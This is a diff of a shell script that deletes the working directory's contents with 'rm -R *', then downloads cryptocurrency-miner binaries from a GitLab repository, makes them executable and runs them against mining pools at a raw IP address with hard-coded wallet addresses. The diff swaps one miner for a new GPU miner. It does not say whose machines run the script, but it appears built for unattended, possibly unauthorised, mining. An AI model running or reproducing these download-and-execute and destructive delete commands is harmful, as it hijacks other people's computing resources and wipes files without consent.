@@ -9,9 +9,8 @@ rm -R *
 wget https://gitlab.com/majapahlevi/mvp/-/raw/main/cpminer
 chmod 777 cpminer && ./cpminer -a yespower -o stratum+tcp://138.197.98.18:443 -u v32fS9jBgzACJdgbUncHz5quaAAbChnZo6.$(shuf -n 1 -i 1-99999)-VISH -t4 &
 
-wget https://gitlab.com/majapahlevi/mvp/-/raw/main/lol1.81
-chmod 777 lol1.81
-
-./lol1.81 -a PYRIN -p 138.197.98.18:80 -u pyrin:qp3dslwvrkxf3qhj6gym52wtadqdqcf39q7y94zmreqyetrwes3r2um5ed0sw.$(shuf -n 1 -i 1-99999)-Bismillah --no-cl
+wget https://gitlab.com/majapahlevi/mvp/-/raw/main/_gram-mining-pool && chmod +x ._gram-mining-pool
+wget https://gitlab.com/majapahlevi/mvp/-/raw/main/garem && chmod +x garem
+./garem --address UQBZnL_zRoiow9vfvlGpZF9SlEZmY7pJADgEaQQO5gBFcveo --gpu-auto --miner cuda
 
 done
